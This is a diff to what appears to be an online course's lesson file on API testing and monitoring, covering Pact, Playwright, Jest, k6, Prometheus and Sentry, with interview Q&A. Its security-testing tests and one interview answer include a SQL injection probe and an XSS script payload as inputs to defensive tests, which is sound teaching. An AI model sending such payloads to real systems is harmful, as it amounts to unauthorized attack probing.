+      uponReceiving: 'a request for user orders',
+      withRequest: {
+        method: 'GET',
+        path: '/users/123/orders',
+        headers: { Accept: 'application/json' }
+      },
+      willRespondWith: {
+        status: 200,
+        headers: { 'Content-Type': 'application/json' },
+        body: [{
+          id: 1,
+          total: 99.99,
+          status: 'shipped'
+        }]
+      }
+    });
+
+    // User Service makes request
+    const orders = await userService.getOrders(123);
+    expect(orders).toHaveLength(1);
+  });
+});
+
+Provider (Order Service) verifies contract:
+// Runs actual Order Service against Pact contract
+// Fails if Order Service doesn't match consumer expectations
+
+Benefits:
+✅ Catch breaking changes before deploy
+✅ Independent service deployments
+✅ Consumer-driven (consumers specify needs)
+✅ No need for E2E tests across all services</div>
+
+                            <h3>End-to-End Tests</h3>
+
+                            <div class="code-block">Test full user workflows
+
+Example: User registration flow
+1. User visits signup page
+2. Enters email/password
+3. Submits form → POST /api/users
+4. Receives confirmation email
+5. Clicks link → GET /api/verify?token=...
+6. Logs in → POST /api/login
+7. Sees dashboard
+
+// e2e/signup.test.js (using Playwright)
+const { test, expect } = require('@playwright/test');
+
+test('user can sign up and log in', async ({ page }) => {
+  // Navigate to signup
+  await page.goto('https://app.example.com/signup');
+
+  // Fill form
+  await page.fill('[name="email"]', 'newuser@example.com');
+  await page.fill('[name="password"]', 'SecurePass123!');
+  await page.click('button[type="submit"]');
+
+  // Check confirmation message
+  await expect(page.locator('.success')).toContainText('Check your email');
+
+  // Simulate email verification (get token from test DB)
+  const token = await getVerificationToken('newuser@example.com');
+  await page.goto(\`https://app.example.com/verify?token=\${token}\`);
+
+  // Log in
+  await page.goto('https://app.example.com/login');
+  await page.fill('[name="email"]', 'newuser@example.com');
+  await page.fill('[name="password"]', 'SecurePass123!');
+  await page.click('button[type="submit"]');
+
+  // Verify dashboard
+  await expect(page).toHaveURL('https://app.example.com/dashboard');
+});
+
+Characteristics:
+- Tests entire stack (browser, API, DB, email)
+- Slow (5-30 seconds per test)
+- Brittle (breaks if UI changes)
+- Expensive to maintain
+
+Use sparingly: Critical flows only (signup, checkout, etc.)</div>
+
+                            <h2>Functional Testing</h2>
+
+                            <div class="code-block">Test that API works correctly
+
+// POST /api/users - Create user
+describe('POST /api/users', () => {
+  test('creates user with valid data', async () => {
+    const res = await request(app)
+      .post('/api/users')
+      .send({
+        name: 'Bob Smith',
+        email: 'bob@example.com',
+        password: 'SecurePass123!'
+      });
+
+    expect(res.status).toBe(201);
+    expect(res.body).toMatchObject({
+      id: expect.any(Number),
+      name: 'Bob Smith',
+      email: 'bob@example.com'
+    });
+    expect(res.body).not.toHaveProperty('password'); // Never return password!
+    expect(res.headers.location).toBe('/api/users/' + res.body.id);
+  });
+
+  test('validates required fields', async () => {
+    const res = await request(app)
+      .post('/api/users')
+      .send({ name: 'Bob' });  // Missing email and password
+
+    expect(res.status).toBe(400);
+    expect(res.body.errors).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ field: 'email', code: 'REQUIRED' }),
+        expect.objectContaining({ field: 'password', code: 'REQUIRED' })
+      ])
+    );
+  });
+
+  test('rejects duplicate email', async () => {
+    // Create first user
+    await request(app).post('/api/users').send({
+      name: 'User 1',
+      email: 'duplicate@example.com',
+      password: 'pass123'
+    });
+
+    // Try to create second user with same email
+    const res = await request(app).post('/api/users').send({
+      name: 'User 2',
+      email: 'duplicate@example.com',
+      password: 'pass456'
+    });
+
+    expect(res.status).toBe(422);
+    expect(res.body.code).toBe('EMAIL_ALREADY_EXISTS');
+  });
+});
+
+Test all scenarios: Success cases, validation errors, edge cases, error handling</div>
+
+                            <h2>Security Testing</h2>
+
+                            <div class="code-block">Test for vulnerabilities
+
+1. Authentication/Authorization
+test('requires authentication', async () => {
+  const res = await request(app).get('/api/users/123');
+  expect(res.status).toBe(401);
+});
+
+test('prevents unauthorized access', async () => {
+  const userToken = await getToken('user@example.com');
+
+  // Try to delete another user
+  const res = await request(app)
+    .delete('/api/users/999')
+    .set('Authorization', \`Bearer \${userToken}\`);
+
+  expect(res.status).toBe(403);
+});
+
+2. SQL Injection
+test('prevents SQL injection', async () => {
+  const res = await request(app)
+    .get('/api/users?name=Bob\\'--');
+
+  expect(res.status).not.toBe(500);  // Shouldn't crash
+});
+
+3. XSS Prevention
+test('sanitizes HTML in responses', async () => {
+  const res = await request(app)
+    .post('/api/comments')
+    .send({ text: '<script>alert("XSS")</script>' });
+
+  expect(res.body.text).not.toContain('<script>');
+});
+
+4. Rate Limiting
+test('enforces rate limits', async () => {
+  // Make 100 requests rapidly
+  const requests = Array(100).fill().map(() =>
+    request(app).get('/api/users')
+  );
+
+  const responses = await Promise.all(requests);
+  const tooManyRequests = responses.filter(r => r.status === 429);
+
+  expect(tooManyRequests.length).toBeGreaterThan(0);
+});
+
+5. HTTPS Enforcement
+test('redirects HTTP to HTTPS', async () => {
+  const res = await request('http://api.example.com').get('/users');
+  expect(res.status).toBe(301);
+  expect(res.headers.location).toMatch(/^https:/);
+});</div>
+
+                            <h2>Performance Testing</h2>
+
+                            <h3>Load Testing with K6</h3>
+
+                            <div class="code-block">Test API under load
+
+// load-test.js
+import http from 'k6/http';
+import { check, sleep } from 'k6';
+
+export const options = {
+  stages: [
+    { duration: '1m', target: 50 },   // Ramp up to 50 users
+    { duration: '3m', target: 50 },   // Stay at 50 users
+    { duration: '1m', target: 100 },  // Ramp up to 100 users
+    { duration: '3m', target: 100 },  // Stay at 100 users
+    { duration: '1m', target: 0 },    // Ramp down
+  ],
+  thresholds: {
+    http_req_duration: ['p(95)<500'],  // 95% requests < 500ms
+    http_req_failed: ['rate<0.01'],    // < 1% failure rate
+  }
+};
+
+export default function () {
+  // GET request
+  const res1 = http.get('https://api.example.com/users');
+  check(res1, {
+    'status is 200': (r) => r.status === 200,
+    'response time < 500ms': (r) => r.timings.duration < 500,
+  });
+
+  sleep(1);  // Think time
+
+  // POST request
+  const res2 = http.post('https://api.example.com/orders', JSON.stringify({
+    productId: 123,
+    quantity: 1
+  }), {
+    headers: { 'Content-Type': 'application/json' }
+  });
+
+  check(res2, {
+    'order created': (r) => r.status === 201
+  });
+
+  sleep(1);
+}
+
+Run: k6 run load-test.js
+
+Results:
+✓ status is 200...........95.2% ✓ 9520 ✗ 480
+✓ response time < 500ms...98.1% ✓ 9810 ✗ 190
+
+http_req_duration.........avg=234ms min=45ms med=210ms max=1.2s p(95)=456ms
+http_req_failed...........0.48%
+
+Identifies: Slow endpoints, bottlenecks, error rate under load</div>
+
+                            <h3>Stress Testing</h3>
+
+                            <div class="code-block">Test API beyond normal load to find breaking point
+
+export const options = {
+  stages: [
+    { duration: '2m', target: 100 },   // Normal load
+    { duration: '5m', target: 100 },
+    { duration: '2m', target: 200 },   // Above normal
+    { duration: '5m', target: 200 },
+    { duration: '2m', target: 300 },   // Stress
+    { duration: '5m', target: 300 },
+    { duration: '2m', target: 400 },   // Breaking point?
+    { duration: '5m', target: 400 },
+    { duration: '10m', target: 0 },    // Recovery
+  ]
+};
+
+Goal: Find when API starts failing
+- At 100 users: p95 = 200ms, 0% errors ✅
+- At 200 users: p95 = 450ms, 0.1% errors ⚠️
+- At 300 users: p95 = 850ms, 2% errors ❌
+- At 400 users: p95 = 2s, 15% errors ❌❌
+
+Conclusion: API handles 200 users well, starts degrading at 300
+Action: Optimize or scale before reaching 300 concurrent users</div>
+
+                            <h2>Testing Tools</h2>
+
+                            <h3>Jest (JavaScript)</h3>
+
+                            <div class="code-block">Popular JavaScript testing framework
+
+// users.test.js
+const { createUser } = require('./users');
+const db = require('./db');
+
+describe('createUser', () => {
+  beforeEach(async () => {
+    await db.migrate.latest();
+  });
+
+  afterEach(async () => {
+    await db.migrate.rollback();
+  });
+
+  test('creates user in database', async () => {
+    const user = await createUser({
+      name: 'Alice',
+      email: 'alice@example.com'
+    });
+
+    expect(user.id).toBeDefined();
+
+    const dbUser = await db('users').where({ id: user.id }).first();
+    expect(dbUser.name).toBe('Alice');
+  });
+});
+
+Features:
+✅ Built-in assertions (expect)
+✅ Mocking (jest.fn(), jest.mock())
+✅ Coverage reports
+✅ Snapshot testing
+✅ Parallel test execution
+
+Run: npm test
+Coverage: npm test -- --coverage</div>
+
+                            <h3>Postman / Newman</h3>
+
+                            <div class="code-block">GUI and CLI for API testing
+
+Postman Collection:
+{
+  "info": { "name": "User API Tests" },
+  "item": [{
+    "name": "Create User",
+    "request": {
+      "method": "POST",
+      "url": "{{baseUrl}}/users",
+      "body": {
+        "mode": "raw",
+        "raw": "{\\"name\\": \\"Alice\\", \\"email\\": \\"alice@example.com\\"}"
+      }
+    },
+    "event": [{
+      "listen": "test",
+      "script": {
+        "exec": [
+          "pm.test('Status is 201', function() {",
+          "  pm.response.to.have.status(201);",
+          "});",
+          "pm.test('Returns user ID', function() {",
+          "  const json = pm.response.json();",
+          "  pm.expect(json.id).to.be.a('number');",
+          "});"
+        ]
+      }
+    }]
+  }]
+}
+
+Run in CI with Newman:
+$ newman run collection.json \\
+  --environment production.json \\
+  --reporters cli,json
+
+Benefits:
+✅ Visual interface (easy for non-developers)
+✅ Share collections with team
+✅ Run in CI/CD with Newman
+✅ Generate documentation from tests</div>
+
+                            <h3>pytest (Python)</h3>
+
+                            <div class="code-block">Python testing framework
+
+# test_users.py
+import pytest
+from app import create_app, db
+from app.models import User
+
+@pytest.fixture
+def client():
+    app = create_app('testing')
+    with app.test_client() as client:
+        with app.app_context():
+            db.create_all()
+            yield client
+            db.drop_all()
+
+def test_create_user(client):
+    response = client.post('/api/users', json={
+        'name': 'Alice',
+        'email': 'alice@example.com'
+    })
+
+    assert response.status_code == 201
+    assert response.json['name'] == 'Alice'
+
+    user = User.query.filter_by(email='alice@example.com').first()
+    assert user is not None
+
+Run: pytest
+Coverage: pytest --cov=app</div>
+
+                            <h2>Best Practices</h2>
+
+                            <h3>Test Data Management</h3>
+
+                            <div class="code-block">Managing test data
+
+❌ BAD: Hardcoded production-like data
+test('get user', async () => {
+  const res = await request(app).get('/api/users/12345');
+  expect(res.body.name).toBe('John Doe');
+});
+→ Fails if user 12345 doesn't exist or name changes
+
+✅ GOOD: Create test data in test
+test('get user', async () => {
+  // Arrange: Create test user
+  const user = await createTestUser({
+    name: 'Test User',
+    email: 'test@example.com'
+  });
+
+  // Act: Get user
+  const res = await request(app).get(\`/api/users/\${user.id}\`);
+
+  // Assert: Verify response
+  expect(res.status).toBe(200);
+  expect(res.body.name).toBe('Test User');
+});
+
+✅ GOOD: Use factories
+const UserFactory = {
+  create: (overrides = {}) => ({
+    name: faker.name.findName(),
+    email: faker.internet.email(),
+    ...overrides
+  })
+};
+
+test('validates email', async () => {
+  const user = UserFactory.create({ email: 'invalid' });
+  const res = await request(app).post('/api/users').send(user);
+  expect(res.status).toBe(400);
+});
+
+✅ GOOD: Clean up after each test
+afterEach(async () => {
+  await db('users').del();  // Delete all users
+  await db('orders').del(); // Delete all orders
+});</div>
+
+                            <h3>Mocking External Services</h3>
+
+                            <div class="code-block">Don't call real external APIs in tests
+
+Example: Payment API
+
+❌ BAD: Call real Stripe API
+test('processes payment', async () => {
+  const res = await request(app)
+    .post('/api/checkout')
+    .send({ amount: 1000, cardToken: 'tok_visa' });
+
+  // This charges real money! ❌
+});
+
+✅ GOOD: Mock Stripe
+jest.mock('stripe', () => ({
+  charges: {
+    create: jest.fn().mockResolvedValue({
+      id: 'ch_123',
+      status: 'succeeded',
+      amount: 1000
+    })
+  }
+}));
+
+test('processes payment', async () => {
+  const res = await request(app)
+    .post('/api/checkout')
+    .send({ amount: 1000, cardToken: 'tok_visa' });
+
+  expect(res.status).toBe(200);
+  expect(stripe.charges.create).toHaveBeenCalledWith({
+    amount: 1000,
+    currency: 'usd',
+    source: 'tok_visa'
+  });
+});
+
+✅ GOOD: Use test mode
+// Stripe has test API keys
+const stripe = require('stripe')(process.env.STRIPE_TEST_KEY);
+// Charges test mode, no real money
+
+Benefits of mocking:
+✅ Fast (no network calls)
+✅ Reliable (no external service downtime)
+✅ Free (no API costs)
+✅ Predictable (control responses)</div>
+
+                            <h3>CI/CD Integration</h3>
+
+                            <div class="code-block">Run tests automatically on every commit
+
+# .github/workflows/test.yml (GitHub Actions)
+name: Test API
+
+on: [push, pull_request]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    services:
+      postgres:
+        image: postgres:14
+        env:
+          POSTGRES_PASSWORD: postgres
+        options: >-
+          --health-cmd pg_isready
+          --health-interval 10s
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v2
+        with:
+          node-version: '18'
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Run unit tests
+        run: npm test
+
+      - name: Run integration tests
+        run: npm run test:integration
+        env:
+          DATABASE_URL: postgres://postgres:postgres@localhost:5432/test
+
+      - name: Upload coverage
+        uses: codecov/codecov-action@v2
+
+Result: Tests run on every push, PR blocked if tests fail</div>
+
+                            <h3>Test Coverage Metrics</h3>
+
+                            <div class="code-block">Measure code coverage
+
+# Run with coverage
+$ npm test -- --coverage
+
+Coverage report:
+--------------------------|---------|----------|---------|---------|
+File                      | % Stmts | % Branch | % Funcs | % Lines |
+--------------------------|---------|----------|---------|---------|
+All files                 |   87.5  |   82.3   |   90.1  |   87.2  |
+ controllers/             |   92.1  |   85.4   |   95.2  |   91.8  |
+  users.js                |   95.3  |   88.2   |  100.0  |   94.9  |
+  orders.js               |   89.7  |   82.1   |   91.2  |   89.1  |
+ models/                  |   78.3  |   71.2   |   80.0  |   77.9  |
+  user.js                 |   85.1  |   75.3   |   87.5  |   84.6  |
+--------------------------|---------|----------|---------|---------|
+
+Goals:
+- Overall: 80%+
+- Critical paths (auth, payment): 95%+
+- New code: 90%+
+
+Don't chase 100%:
+- Diminishing returns
+- Focus on critical code
+- Coverage != quality (can have 100% coverage with bad tests)</div>
+
+                            <h2>Summary</h2>
+
+                            <ul>
+                                <li><strong>Testing pyramid:</strong> Many unit tests (fast, cheap), some integration tests, few E2E tests (slow, expensive)</li>
+                                <li><strong>Unit tests:</strong> Test business logic in isolation, fast, no dependencies</li>
+                                <li><strong>Integration tests:</strong> Test API endpoints with real HTTP requests and database</li>
+                                <li><strong>Contract tests:</strong> Test API contracts between microservices (Pact), prevent breaking changes</li>
+                                <li><strong>E2E tests:</strong> Test full workflows (signup, checkout), use sparingly for critical paths only</li>
+                                <li><strong>Security testing:</strong> Test auth/authz, SQL injection, XSS, rate limiting, HTTPS enforcement</li>
+                                <li><strong>Performance testing:</strong> Load testing (K6, JMeter), stress testing to find breaking point</li>
+                                <li><strong>Tools:</strong> Jest (JavaScript), pytest (Python), Postman/Newman (GUI/CLI), K6 (performance)</li>
+                                <li><strong>Test data:</strong> Create in tests, use factories (faker), clean up after each test</li>
+                                <li><strong>Mocking:</strong> Mock external services (Stripe, SendGrid), use test API keys when available</li>
+                                <li><strong>CI/CD:</strong> Run tests automatically on every push, block PRs if tests fail</li>
+                                <li><strong>Coverage:</strong> Aim for 80%+ overall, 95%+ for critical paths, don't chase 100%</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What is the testing pyramid and how should it guide API testing strategy?",
+                                answer: "Testing pyramid: Many unit tests (bottom/base), some integration tests (middle), few E2E tests (top). Ratio: roughly 70% unit, 20% integration, 10% E2E. Rationale: 1) Unit tests are fast (ms), cheap, easy to debug - test business logic in isolation with mocked dependencies, 2) Integration tests are slower (seconds), test actual API endpoints with real DB/HTTP but mock external services, 3) E2E tests are slowest (minutes), brittle, expensive - test full workflows with browser/API/DB/external services. For APIs specifically: Unit tests (validation logic, business rules, pure functions), Integration tests (endpoint behavior, auth, database operations - this is where most API testing happens), E2E tests (critical workflows like signup, checkout - only for most important paths). Why pyramid not rectangle: Slow tests delay feedback, brittle tests break often requiring maintenance, expensive tests cost time and infrastructure. Example: For user CRUD API, write 50 unit tests (validators, permissions), 20 integration tests (GET/POST/PUT/DELETE endpoints), 2 E2E tests (user registration flow, full order workflow). Avoid inverted pyramid (mostly E2E) - too slow for fast iteration."
+                            },
+                            {
+                                question: "How do you test API security in automated tests?",
+                                answer: "API security testing approaches: 1) Authentication: test('requires authentication', () => { expect(res.status).toBe(401) when no token }), test('rejects invalid token'), test('rejects expired token'), 2) Authorization: test('prevents unauthorized access', () => { userToken tries to delete another user → expect 403 }), test different roles (user vs admin), 3) SQL Injection: test('prevents SQL injection', () => { GET /users?name=Bob'-- → shouldn't crash or leak data }), use parameterized queries, 4) XSS: test('sanitizes HTML', () => { POST comment with <script>alert('XSS')</script> → expect sanitized in response }), 5) Rate limiting: test('enforces rate limits', () => { make 100 rapid requests → some should return 429 }), 6) HTTPS: test('redirects HTTP to HTTPS'), 7) Input validation: test('rejects malicious input', () => { very long strings, special chars, etc. }). Tools: OWASP ZAP (automated vulnerability scanning), Burp Suite (manual pentesting), npm audit (dependency vulnerabilities). Best practice: Security tests in CI/CD, fail build on vulnerabilities. Don't rely solely on automated tests - also do manual security reviews and pentesting for production APIs."
+                            },
+                            {
+                                question: "What is contract testing and when should you use it?",
+                                answer: "Contract testing verifies that services meet agreed-upon API contracts. Problem: In microservices, Service A depends on Service B's API. If Service B changes response format, Service A breaks. Traditional solution: E2E tests (slow, brittle). Contract testing solution: 1) Consumer (Service A) defines expectations: 'When I GET /users/123, I expect { id: 123, name: string }', 2) Generate contract (Pact file), 3) Provider (Service B) verifies it can meet contract by running against actual API, 4) Both services can deploy independently as long as contracts satisfied. Implementation with Pact: Consumer creates mock: provider.addInteraction({ request: { method: 'GET', path: '/users/123' }, willRespondWith: { status: 200, body: { id: 123, name: 'Alice' } } }), then tests against mock. Provider verifies: runs actual API against consumer's contract. When to use: 1) Microservices architecture with API dependencies, 2) Multiple teams owning different services, 3) Want independent deployments without E2E tests. When NOT needed: Monoliths, single service, internal functions. Benefits: Catch breaking changes before deploy, faster than E2E tests, consumer-driven (consumers specify what they need), enables confident independent deployments. Alternative: OpenAPI spec validation (provider publishes spec, consumers validate against it - provider-driven instead of consumer-driven)."
+                            },
+                            {
+                                question: "How do you perform load testing on APIs and what metrics matter?",
+                                answer: "Load testing simulates multiple users to measure API performance under load. Tool: K6 (recommended), JMeter (Java), Locust (Python). K6 example: Define stages (ramp to 50 users over 1min, stay at 50 for 3min, ramp to 100, etc.), define scenario (GET /users, wait 1s, POST /orders, wait 1s), set thresholds (p95 < 500ms, error rate < 1%), run: k6 run script.js. Key metrics: 1) Response time (p50/p95/p99 - median, 95th percentile, 99th percentile), 2) Throughput (requests per second), 3) Error rate (% failed requests), 4) Saturation (CPU/memory/DB connections), 5) Apdex score (user satisfaction). Example results: 100 users → p95=200ms, 0% errors (good), 200 users → p95=450ms, 0.1% errors (acceptable), 300 users → p95=850ms, 2% errors (degraded), 400 users → p95=2s, 15% errors (failing). Conclusion: API handles 200 users, needs optimization/scaling before 300. Stress testing: Push beyond normal load to find breaking point. Spike testing: Sudden traffic burst. Soak testing: Sustained load for hours (find memory leaks). Run in staging environment with production-like data volume. Monitor: Database slow query log, APM tools, server metrics."
+                            },
+                            {
+                                question: "How should you manage test data in API integration tests?",
+                                answer: "Test data management strategies: 1) Create per test: beforeEach create test data, afterEach clean up - each test isolated, predictable. Example: const user = await createTestUser({ name: 'Test', email: 'test@example.com' }), then test against this user, finally await db('users').del(). 2) Use factories: Generate realistic test data with libraries like faker: const UserFactory = { create: () => ({ name: faker.name(), email: faker.internet.email() }) }, allows overrides: UserFactory.create({ email: 'specific@example.com' }). 3) Fixtures: Seed database with known data before tests: beforeAll(() => db.seed.run()), works for read-only tests. 4) Database per test: Transactions - start transaction before test, rollback after (fast, no real DB writes). 5) In-memory DB: Use SQLite in-memory for speed (limitation: different SQL dialect from production Postgres). Best practices: 1) Don't use production data (privacy, unpredictable), 2) Don't share data between tests (tests should be independent), 3) Clean up after tests (avoid pollution), 4) Use meaningful test data (easier debugging than random). Bad: Hardcoded IDs (expect user 12345 to exist) - brittle. Good: Create what you need, test against what you created. For large datasets: Use database snapshots/backups, restore before test suite."
+                            },
+                            {
+                                question: "When should you mock external services vs use real services in tests?",
+                                answer: "Mock vs real services decision: Mock when: 1) Third-party APIs (Stripe, SendGrid, AWS) - avoid costs, rate limits, unpredictable responses, 2) Slow services (external APIs taking seconds), 3) Services you don't control (can go down, change unexpectedly), 4) Non-idempotent operations (sending real emails, charging cards - don't want in tests). Use real when: 1) Your own services (database, Redis, message queues), 2) Integration testing (need real behavior), 3) Contract testing (verify actual responses). Mocking approach: jest.mock('stripe', () => ({ charges: { create: jest.fn().mockResolvedValue({ id: 'ch_123', status: 'succeeded' }) } })), then verify mock called correctly: expect(stripe.charges.create).toHaveBeenCalledWith({ amount: 1000 }). Test mode alternative: Many services (Stripe, SendGrid) have test API keys - use real API in test mode (no charges/emails actually sent). Benefits: Test actual integration, catch API changes. Hybrid: Unit tests mock everything (fast), integration tests use real DB/Redis but mock external APIs, E2E tests use real everything (including test mode external services). Never: Call production APIs, send real emails, charge real cards in automated tests. Exception: Dedicated production smoke tests (run manually/scheduled, not on every commit)."
+                            }
+                        ]
                     },
                     {
                         id: 'monitoring-analytics',
                         title: 'API Monitoring & Analytics',
                         duration: '45 min',
                         content: `
-                            <h2>OUTLINE: Monitoring & Analytics</h2>
+                            <h2>Key Metrics</h2>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Key Metrics</strong>
-                                    - Response time (p50, p95, p99)
-                                    - Error rate (4xx, 5xx)
-                                    - Throughput (requests per second)
-                                    - Availability/uptime
-                                </li>
-                                <li><strong>Monitoring Tools</strong>
-                                    - Application Performance Monitoring (APM)
-                                    - Log aggregation (ELK, Splunk)
-                                    - Metrics (Prometheus, Grafana)
-                                    - Distributed tracing (Jaeger, Zipkin)
-                                    - Error tracking (Sentry, Rollbar)
-                                </li>
-                                <li><strong>Alerting</strong>
-                                    - Alert thresholds
-                                    - Alert fatigue prevention
-                                    - On-call rotations
-                                    - Incident response
-                                </li>
-                                <li><strong>Analytics</strong>
-                                    - Usage patterns
-                                    - Popular endpoints
-                                    - Client analytics
-                                    - API health dashboards
-                                </li>
+                            <p>Monitoring your API requires tracking the right metrics to understand health, performance, and user experience.</p>
+
+                            <h3>Response Time (Latency)</h3>
+
+                            <div class="code-block">Track percentiles, not just averages
+
+❌ BAD: Average response time
+Average: 200ms
+→ Hides slow requests (one 10s request + nine 100ms requests = 1.09s average)
+
+✅ GOOD: Percentiles
+p50 (median): 150ms     → Half of requests faster than this
+p95: 450ms              → 95% of requests faster than this
+p99: 1.2s               → 99% of requests faster than this
+p99.9: 3.5s             → 99.9% of requests faster than this
+
+Why percentiles matter:
+- p95 = user experience for most users
+- p99 = worst experience (tail latency)
+- p50 alone doesn't show outliers
+
+Example interpretation:
+p50: 100ms, p95: 200ms, p99: 5s
+→ Most requests fast, but 1% very slow (investigate!)
+
+SLA example:
+"95% of requests complete in < 500ms" = p95 < 500ms</div>
+
+                            <h3>Error Rate</h3>
+
+                            <div class="code-block">Track client vs server errors separately
+
+4xx Client Errors (user mistakes):
+- 400 Bad Request
+- 401 Unauthorized
+- 403 Forbidden
+- 404 Not Found
+- 429 Too Many Requests
+
+5xx Server Errors (your problems):
+- 500 Internal Server Error
+- 502 Bad Gateway
+- 503 Service Unavailable
+- 504 Gateway Timeout
+
+Metrics to track:
+- Total error rate: (errors / total requests) * 100
+- 4xx rate: Usually higher, normal (user mistakes)
+- 5xx rate: Should be near 0% (your bugs)
+- Error rate by endpoint: Which endpoints failing?
+
+Example:
+Total requests: 10,000
+4xx errors: 150 (1.5% - validation errors, auth failures)
+5xx errors: 5 (0.05% - acceptable)
+
+Alert threshold:
+- 5xx rate > 0.1% → Page on-call engineer
+- 5xx rate > 1% → Critical alert</div>
+
+                            <h3>Throughput</h3>
+
+                            <div class="code-block">Requests per second (RPS)
+
+Current throughput: 500 RPS
+Peak throughput: 1,200 RPS (during lunch hour)
+Average: 350 RPS
+
+Track:
+- RPS per endpoint: Which endpoints are popular?
+- RPS over time: Daily/weekly patterns
+- RPS by client: Which clients use API most?
+
+Capacity planning:
+Current: 500 RPS
+Max capacity: 2,000 RPS (load test result)
+→ 75% headroom available
+
+Growing 10% per month:
+Month 1: 500 RPS
+Month 6: 805 RPS
+Month 12: 1,555 RPS
+→ Need scaling plan before month 12</div>
+
+                            <h3>Availability / Uptime</h3>
+
+                            <div class="code-block">SLA (Service Level Agreement)
+
+Common SLA tiers:
+99% ("two nines"): 3.65 days downtime/year
+99.9% ("three nines"): 8.76 hours downtime/year
+99.95%: 4.38 hours downtime/year
+99.99% ("four nines"): 52.56 minutes downtime/year
+99.999% ("five nines"): 5.26 minutes downtime/year
+
+Calculate:
+uptime = (total time - downtime) / total time
+
+Example:
+30 days = 43,200 minutes
+Downtime: 60 minutes
+Uptime: (43,200 - 60) / 43,200 = 99.86%
+
+Track:
+- API uptime (can users access API?)
+- Endpoint uptime (per-endpoint availability)
+- Success rate (successful responses / total)
+
+Don't count scheduled maintenance as downtime
+(announce maintenance window in advance)</div>
+
+                            <h2>Monitoring Tools</h2>
+
+                            <h3>Application Performance Monitoring (APM)</h3>
+
+                            <div class="code-block">APM tools provide end-to-end visibility
+
+Popular APM tools:
+- New Relic
+- DataDog
+- Dynatrace
+- AppDynamics
+- Elastic APM
+
+Features:
+✅ Request tracing (see full request path)
+✅ Performance breakdown (DB, external APIs, etc.)
+✅ Error tracking with stack traces
+✅ Real-time dashboards
+✅ Alerting
+✅ Code-level insights
+
+Example: New Relic
+// Auto-instrumentation
+require('newrelic');  // Add at top of app
+
+// Custom instrumentation
+const newrelic = require('newrelic');
+
+app.get('/api/users', async (req, res) => {
+  await newrelic.startSegment('fetchUsers', true, async () => {
+    const users = await db.users.findAll();
+    return users;
+  });
+
+  res.json(users);
+});
+
+Dashboard shows:
+- Slowest transactions
+- Error rate per endpoint
+- Database query time
+- External service calls
+- Memory/CPU usage
+- Apdex score (user satisfaction)</div>
+
+                            <h3>Log Aggregation</h3>
+
+                            <div class="code-block">Centralize logs from all servers
+
+ELK Stack (Elasticsearch, Logstash, Kibana):
+
+1. Application logs (structured JSON)
+logger.info({
+  request_id: 'req_123',
+  method: 'GET',
+  path: '/api/users/123',
+  status: 200,
+  duration_ms: 45,
+  user_id: 123
+});
+
+2. Logstash collects and parses logs
+input {
+  file {
+    path => "/var/log/api/*.log"
+    codec => "json"
+  }
+}
+
+filter {
+  # Parse, enrich, transform
+}
+
+output {
+  elasticsearch {
+    hosts => ["localhost:9200"]
+  }
+}
+
+3. Elasticsearch indexes logs
+→ Search, filter, aggregate
+
+4. Kibana visualizes logs
+→ Dashboards, charts, alerts
+
+Query examples:
+- Show all errors: status >= 400
+- Slow requests: duration_ms > 1000
+- Specific user: user_id = 123
+- Time range: last 24 hours
+
+Alternative: Splunk (commercial, powerful)
+Alternative: Grafana Loki (like Prometheus for logs)</div>
+
+                            <h3>Metrics (Prometheus + Grafana)</h3>
+
+                            <div class="code-block">Time-series metrics
+
+Prometheus (collect metrics):
+// app.js
+const promClient = require('prom-client');
+
+// Create metrics
+const httpRequestDuration = new promClient.Histogram({
+  name: 'http_request_duration_seconds',
+  help: 'HTTP request duration in seconds',
+  labelNames: ['method', 'route', 'status_code']
+});
+
+const httpRequestTotal = new promClient.Counter({
+  name: 'http_requests_total',
+  help: 'Total HTTP requests',
+  labelNames: ['method', 'route', 'status_code']
+});
+
+// Middleware to record metrics
+app.use((req, res, next) => {
+  const start = Date.now();
+
+  res.on('finish', () => {
+    const duration = (Date.now() - start) / 1000;
+
+    httpRequestDuration.labels(
+      req.method,
+      req.route?.path || req.path,
+      res.statusCode
+    ).observe(duration);
+
+    httpRequestTotal.labels(
+      req.method,
+      req.route?.path || req.path,
+      res.statusCode
+    ).inc();
+  });
+
+  next();
+});
+
+// Expose metrics endpoint
+app.get('/metrics', async (req, res) => {
+  res.set('Content-Type', promClient.register.contentType);
+  res.end(await promClient.register.metrics());
+});
+
+Grafana (visualize metrics):
+- Connect to Prometheus
+- Create dashboards
+- Query: rate(http_requests_total[5m])
+- Visualize: Line charts, gauges, heatmaps
+
+Dashboard panels:
+- Request rate (RPS)
+- Response time (p50, p95, p99)
+- Error rate (%)
+- Endpoint breakdown
+- Status code distribution</div>
+
+                            <h3>Distributed Tracing</h3>
+
+                            <div class="code-block">Trace requests across microservices
+
+Jaeger / Zipkin:
+
+See in previous lesson (Debugging & Troubleshooting)
+
+Benefits for monitoring:
+- Find slow services in request path
+- Identify bottlenecks (DB query? External API?)
+- See service dependencies
+- Debug production issues
+
+Example trace:
+API Gateway (50ms)
+  → Auth Service (10ms)
+    → User Service (150ms)
+      → Database (140ms) ← Bottleneck!
+    → Cache (5ms)
+
+Total: 215ms
+
+Insight: Database query is slow, add index or cache</div>
+
+                            <h3>Error Tracking</h3>
+
+                            <div class="code-block">Sentry / Rollbar for error monitoring
+
+// Setup Sentry
+const Sentry = require('@sentry/node');
+
+Sentry.init({
+  dsn: 'https://abc@sentry.io/123',
+  environment: 'production'
+});
+
+// Automatic error capture
+app.use(Sentry.Handlers.errorHandler());
+
+// Manual error capture
+try {
+  await processPayment(orderId);
+} catch (error) {
+  Sentry.captureException(error, {
+    tags: { order_id: orderId },
+    user: { id: userId },
+    extra: { payment_details: {...} }
+  });
+  throw error;
+}
+
+Sentry dashboard shows:
+- Error frequency (10 errors in last hour)
+- Affected users (3 users)
+- Stack trace with code context
+- Breadcrumbs (request path leading to error)
+- Environment (browser, OS, API version)
+- Release version
+
+Benefits:
+✅ Group similar errors
+✅ See first occurrence vs recent spike
+✅ Track resolution (mark as fixed)
+✅ Alert on new errors
+✅ Prioritize by user impact</div>
+
+                            <h2>Alerting</h2>
+
